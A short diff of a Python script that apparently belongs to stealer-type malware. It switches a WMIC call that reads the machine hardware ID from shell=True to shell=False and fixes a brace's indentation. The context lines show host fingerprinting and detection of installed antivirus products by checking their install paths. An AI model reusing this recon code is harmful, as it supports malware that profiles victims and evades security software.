@@ -105,7 +105,7 @@ drive space available: {get_size(mount.free)}
 drive space used: {get_size(mount.used)}
 """
     try:
-        hwid = check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
+        hwid = check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=False,
                                         stdin=PIPE, stderr=PIPE).decode('utf-8').split('\n')[1].strip()
     except:
         Log(f"hwid ---> can't get")
@@ -144,7 +144,7 @@ drive space used: {get_size(mount.used)}
         'C:\\Program Files (x86)\\360\\Total Security': '360 Total Security',
         'C:\\Program Files\\ESET\\ESET NOD32 Antivirus': 'ESET NOD32',
         'C:\\Program Files\\Malwarebytes\\Anti-Malware': 'Malwarebytes'
-        }
+    }
 
 
     Antiviruses = [Antiviruses[d] for d in filter(exists, Antiviruses)]
